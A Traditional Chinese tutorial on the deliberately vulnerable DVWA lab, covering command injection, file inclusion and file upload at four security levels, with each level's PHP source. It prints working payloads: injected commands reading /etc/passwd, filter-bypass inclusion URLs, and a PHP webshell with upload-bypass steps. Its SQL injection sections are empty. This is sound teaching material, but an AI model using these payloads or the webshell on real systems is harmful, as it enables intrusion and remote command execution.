# DVWA（Damn Vulnerable Web Application）

DVWA（Damn Vulnerable Web Application）是一個用來進行安全脆弱性鑒定的PHP/MySQL Web應用，
旨在為安全專業人員測試自己的專業技能和工具提供合法的環境，幫助web開發者更好的理解web應用安全防范的過程。

### [演練平台](http://120.114.102.164)

### [OWASP TOP 10漏洞(OWASP Top 10 2017)](https://www.owasp.org/index.php/Top_10-2017_Top_10)

```
A1:2017-Injection
A2:2017-Broken Authentication
A3:2017-Sensitive Data Exposure
A4:2017-XML External Entities (XXE){新增}
A5:2017-Broken Access Control
A6:2017-Security Misconfiguration
A7:2017-Cross-Site Scripting (XSS)
A8:2017-Insecure Deserialization{新增}
Insecure deserialization often leads to remote code execution.

A9:2017-Using Components with Known Vulnerabilities
A10:2017-Insufficient Logging&Monitoring{新增}
```

# DVWA漏洞模組(未涵蓋2017年版TOP 10)

>* Command Injection（命令行注入）
>* SQL Injection（SQL注入）
>* SQL Injection（Blind）（SQL盲注）

>* Brute Force（暴力（破解））
>* Insecure CAPTCHA（不安全的驗證碼)

>* File Inclusion（文件包含）
>* File Upload（文件上傳）

>* XSS（Reflected）（反射型跨站腳本）
>* XSS（Stored）（存儲型跨站腳本）
>* XSS(DOM)
>* CSRF（跨站請求偽造）

DVWA 分為四種安全級別：Low，Medium，High，Impossible

# DVWA 測試步驟
```
步驟一:登錄DVWA

步驟二:選擇安全級別
將dvwa-security-裏面的安全級別調到最低級別

步驟三:選擇題目頁面

步驟四:進行攻擊測試
```

# Command Injection（命令行注入）

>* [3-Command Injection | Low | Medium | High | DVWA Video Tutorial Series](https://www.youtube.com/watch?v=0ln7nsCQlaI)

### Low
***
```
攻擊測試

step 1: 輸入127.0.0.1 ==> 點擊submit
step 2: 輸入127.0.0.1 ; cat /etc/passwd ==> 點擊submit


真正駭客會注入一隻one-line PHP webshell[請自行研讀!~請勿做壞事]

輸入127.0.0.1 ; {one-line PHP webshell} ==> 點擊submit

==>你的成果畫面

```
>* [DVWA - Command Injection注入一隻網站木馬](https://www.youtube.com/watch?v=NxSNTT627TQ)

關鍵程式碼解析
```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // 使用$_REQUEST來接收輸入的IP(完全沒有驗證使用者輸入的資料) 
    $target = $_REQUEST[ 'ip' ]; 

    // 決定作業系統並執行相對應的ping指令 OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping  ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo "<pre>{$cmd}</pre>"; 
} 

?> 
```
>* PHP 預先定義的變數(Predefined Variables)$_REQUEST



### Medium

關鍵程式碼解析==>使用黑名單(blacklist)過濾
```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = $_REQUEST[ 'ip' ]; 

    // Set blacklist 設定黑名單
    $substitutions = array( 
        '&&' => '', 
        ';'  => '', 
    ); 

    // 使用黑名單(blacklist)過濾 Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping  ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo "<pre>{$cmd}</pre>"; 
} 

?> 
```

攻擊技法==>繞過黑名單(blacklist)過濾==>使用 | 
```
127.0.0.1 | cat /etc/passwd
```

### High

更完整的黑名單(blacklist)過濾
```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = trim($_REQUEST[ 'ip' ]); 

    // Set blacklist 
    $substitutions = array( 
        '&'  => '', 
        ';'  => '', 
        '| ' => '', 
        '-'  => '', 
        '$'  => '', 
        '('  => '', 
        ')'  => '', 
        '`'  => '', 
        '||' => '', 
    ); 

    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping  ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo "<pre>{$cmd}</pre>"; 
} 

?> 
```
攻擊1==>繞過黑名單(blacklist)過==>把空白拿掉 ==>殘念
```
127.0.0.1|cat /etc/passwd
127.0.0.1|cat%20/etc/passwd
```
攻擊2==>繞過黑名單(blacklist)過==>使用 | ==>部分有用
```
127.0.0.1|ls
```


### Impossible<<至高無上防禦工法>>

更嚴謹的防禦==>這下打不進去了吧!==>若你打得進去我請你吃年肉麵
```
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $target = $_REQUEST[ 'ip' ]; 
    $target = stripslashes( $target ); 

    // Split the IP into 4 octects 
    $octet = explode( ".", $target ); 

    // Check IF each octet is an integer 
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { 
        // If all 4 octets are int's put the IP back together. 
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; 

        // Determine OS and execute the ping command. 
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
            // Windows 
            $cmd = shell_exec( 'ping  ' . $target ); 
        } 
        else { 
            // *nix 
            $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
        } 

        // Feedback for the end user 
        echo "<pre>{$cmd}</pre>"; 
    } 
    else { 
        // Ops. Let the user name theres a mistake 
        echo '<pre>ERROR: You have entered an invalid IP.</pre>'; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?> 
```

# SQL Injection（SQL注入）

### Low


### Medium

### High

### Impossible

# SQL Injection（Blind）（SQL盲注）

### Low

### Medium
```
```

### High

### Impossible

# File Inclusion（文件包含）

>* File Inclusion[檔案包含]:當伺服器開啟allow_url_include選項時，就可通過php的某些特性函數[include()，require()和include_once()，require_once()]利用url去動態包含文件

[File inclusion vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)
>* 如果沒有對檔案來源進行嚴格審查，就會導致任意檔案讀取或者任意命令執行。
>* 分為本地檔包含漏洞(Local file Inclusion(LFI))與遠端檔包含漏洞(Remote file Inclusion(RFL))
>* 遠端檔包含漏洞是因為開啟了php配置中的allow_url_fopen選項（選項開啟之後，伺服器允許包含一個遠端的檔）。

### Low
***
步驟一:點選網站上的超連結==?仔細看瀏覽器的變化
```
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file1.php
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file2.php
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file3.php
```
步驟二:測試是否存在File inclusion vulnerability
```
LFI 攻擊測試==>
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=/etc/passwd
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=../../etc/passwd

RFI 攻擊測試==>
http://192.168.1.250/DVWA/vulnerabilities/fi/? page=http://www.google.com
```
不肖客是如何利用RFI 漏洞?
>* 不肖客自己先植入惡意程式在國外網站
>* 在攻擊有RFI 漏洞並用來讀取別台機器上的惡意程式

客戶端程式分析
```
<div class="body_padded">
	<h1>Vulnerability: File Inclusion</h1>

	

	<div class="vulnerable_code_area">
		[<em><a href="?page=file1.php">file1.php</a></em>] - [<em><a href="?page=file2.php">file2.php</a></em>] - [<em><a href="?page=file3.php">file3.php</a></em>]
	</div>

	<h2>More Information</h2>
	<ul>
		<li><a href="https://en.wikipedia.org/wiki/Remote_File_Inclusion" target="_blank">https://en.wikipedia.org/wiki/Remote_File_Inclusion</a></li>
		<li><a href="https://www.owasp.org/index.php/Top_10_2007-A3" target="_blank">https://www.owasp.org/index.php/Top_10_2007-A3</a></li>
	</ul>
</div>

```
伺服器漏洞程式分析
```
<?php 

// The page we wish to display 
$file = $_GET[ 'page' ]; 
//伺服器端對page參數沒有做任何的(輸入驗證)[過濾跟檢查]
?> 
```

### Medium
***
如何避免File inclusion vulnerability??

使用PHP str_replace() 函数過濾掉不該出現的咚咚

伺服器程式分析
```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation(輸入驗證)
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?> 
```
但是還是可以進行攻擊==>使用雙寫繞過替換規則

```
LFI 攻擊測試==>
http://192.168.2.119/DVWA/vulnerabilities/fi/?page=..//etc/passwd

RFI 攻擊測試==>
http://192.168.2.119/DVWA/vulnerabilities/fi/?page=hthttp://tp://google.com
```


### High
***

>* 嚴格定義include的檔案名稱是file開頭[file1.php, file2.php , file3.php ]

伺服器程式分析
```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation(輸入驗證)
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```
使用了fnmatch函數檢查page參數，要求page參數的開頭必須是file，伺服器才會去包含相應的檔

攻擊測試
```
LFI 攻擊測試==>利用file協定
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file:///etc/passwd

比較看看
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=/etc/passwd

RFI 攻擊測試==>無法攻擊
```
### Impossible
***
```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```
# File Upload（文件上傳）

### Low

webshell程式碼::shell1.php
```
<form action="" method="get">
Command: <input type="text" name="cmd" /><input type="submit" value="submit" />
</form>
Output:<br />
<pre>
<?php 
if (isset($_GET['cmd']))    
(    
system($_GET['cmd'])
) 
?>
</pre>
```

攻擊技術
```
先上傳正常圖片==>看看放在哪一個目錄
http://192.168.1.250/DVWA/vulnerabilities/upload/


再上傳一隻webshell(副檔名是php)
http://192.168.1.250/DVWA/vulnerabilities/upload/../../hackable/uploads/shell1.php

在瀏覽器直接執行遠端程式
http://192.168.1.250/DVWA/hackable/uploads/shell1.php

http://192.168.1.250/DVWA/hackable/uploads/shell1.php?cmd=ifconfig

```

關鍵程式碼解析
```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // Can we move the file to the upload folder? 
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
        // No 
        echo '<pre>Your image was not uploaded.</pre>'; 
    } 
    else { 
        // Yes! 
        echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
    } 
} 

?> 
```
### Medium

中階防禦工法==>檔案類型(jpg,png)檢查與大小限制
```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 

    // Is it an image? 檔案類型(jpg,png)檢查與大小限制
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && 
        ( $uploaded_size < 100000 ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?> 

```
再次攻擊
```
將webshell先修改副檔名:shell2.php==>shell2.jpg

使用burpsuite攔截再改回名稱:
filename=shell2.jpg==>filename=shell2.php

```


### High

高階防禦工法==>程式碼限制了副檔名的名稱(jpg,jpeg,png)

```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) && 
        ( $uploaded_size < 100000 ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?> 

```

```

```

### Impossible

```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 


    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

    // Where are we going to be writing to? 
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; 
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; 
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); 
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && 
        ( $uploaded_size < 100000 ) && 
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
        if( $uploaded_type == 'image/jpeg' ) { 
            $img = imagecreatefromjpeg( $uploaded_tmp ); 
            imagejpeg( $img, $temp_file, 100); 
        } 
        else { 
            $img = imagecreatefrompng( $uploaded_tmp ); 
            imagepng( $img, $temp_file, 9); 
        } 
        imagedestroy( $img ); 

        // Can we move the file to the web root from the temp folder? 
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
            // Yes! 
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>"; 
        } 
        else { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 

        // Delete any temp files 
        if( file_exists( $temp_file ) ) 
            unlink( $temp_file ); 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?>
```

